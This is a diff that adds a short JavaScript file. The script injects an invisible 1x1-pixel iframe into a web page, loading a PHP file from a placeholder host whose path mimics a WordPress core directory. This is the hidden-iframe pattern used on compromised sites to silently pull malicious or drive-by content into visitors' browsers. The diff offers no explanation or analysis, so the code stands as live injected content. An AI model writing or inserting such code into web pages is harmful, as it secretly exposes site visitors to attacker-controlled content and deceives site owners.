@@ -1,0 +1,16 @@
+(function () {
+    var qk = document.createElement('iframe');
+
+    qk.src = 'http://xxx.tld/wp-includes/dtd.php';
+    qk.style.position = 'absolute';
+    qk.style.border = '0';
+    qk.style.height = '1px';
+    qk.style.width = '1px';
+    qk.style.left = '1px';
+    qk.style.top = '1px';
+
+    if (!document.getElementById('qk')) {
+        document.write('<div id=\'qk\'></div>');
+        document.getElementById('qk').appendChild(qk);
+    }
+})();
